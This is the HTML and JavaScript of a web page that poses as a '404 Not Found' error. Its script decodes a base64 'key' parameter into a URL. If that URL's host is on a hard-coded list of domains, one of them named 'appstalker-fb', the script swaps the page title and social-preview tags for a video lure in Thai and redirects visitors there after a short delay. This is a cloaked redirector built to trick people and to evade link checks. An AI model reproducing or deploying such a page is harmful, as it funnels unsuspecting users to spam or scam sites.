<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <base href="https://livesekhd.eu.org">
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title id="meta-title">404 Not Found</title>
  <meta name="description" content="Page not found." id="meta-desc">
  <meta property="og:title" content="404 Not Found" id="og-title">
  <meta property="og:description" content="Page is unavailable or invalid." id="og-desc">
  <meta name="robots" content="noindex, nofollow">

  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet" />
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #f8f9fa;
      text-align: center;
      padding: 50px;
    }
    .error-code {
      font-size: 8rem;
      font-weight: bold;
      color: #dc3545;
    }
    .loader-screen {
      display: none;
      justify-content: center;
      align-items: center;
      flex-direction: column;
      position: fixed;
      top: 0; left: 0;
      width: 100vw;
      height: 100vh;
      background: #fff;
      z-index: 99;
    }
    img {
      width: 100%;
      max-width: 400px;
      height: auto;
      margin: 10px auto;
      display: block;
    }
  </style>
</head>
<body>

<!-- 🔁 Lazy load image untuk key -->
<img 
  id="keyImage" 
  src="https://i0.wp.com/i.gifer.com/7V2A.gif" 
  data-src="https://iili.io/FFCRiU9.md.jpg" 
  alt="Key image" 
/>

<!-- 🔁 Lazy load image untuk error -->
<img 
  id="errorImage" 
  src="https://i0.wp.com/i.gifer.com/7V2A.gif" 
  data-src="https://iili.io/FFCTzvN.md.jpg" 
  alt="404 image" 
/>

<div id="loader" class="loader-screen">
  <div class="spinner-border text-primary" role="status"></div>
  <p>Redirecting...</p>
</div>

<div id="errorPage">
  <div class="error-code">404</div>
  <h2>Oops! Page not found</h2>
  <p>The link is invalid or not part of this website.</p>
</div>

<script>
(function () {
  const params = new URLSearchParams(window.location.search);
  const encoded = params.get('key');
  if (!encoded) return;

  try {
    const decoded = atob(encoded.trim());
    const finalUrl = decoded;

    const urlObj = new URL(finalUrl);
    const host = urlObj.hostname;

    const allowedDomains = [
      "abnormalitylovingmammal.com",
      "pwcenter.eu.org",
      "otieu.com",
      "appstalker-fb.eu.org",
      "xpweyurt.eu.org"
    ];

    const isAllowed = allowedDomains.some(domain => host.includes(domain));

    if (isAllowed) {
      const title = "Watch Enkai987 น้อง ริน มาแน้วววว";

      document.getElementById('meta-title').innerText = title;
      document.getElementById('meta-desc').setAttribute('content', title);
      document.getElementById('og-title').setAttribute('content', title);
      document.getElementById('og-desc').setAttribute('content', title);

      document.getElementById("errorPage").style.display = "none";
      document.getElementById("loader").style.display = "flex";

      setTimeout(() => {
        window.location.href = finalUrl;
      }, 1500);
    } else {
      console.warn("Domain tidak diizinkan:", host);
    }
  } catch (err) {
    console.error("Broken key:", err);
  }
})();
</script>

<script>
  document.addEventListener("DOMContentLoaded", function () {
    const lazyImgs = document.querySelectorAll('img[data-src]');
    lazyImgs.forEach(img => {
      const temp = new Image();
      temp.onload = () => img.src = img.dataset.src;
      temp.src = img.dataset.src;
    });
  });
</script>

</body>
</html>
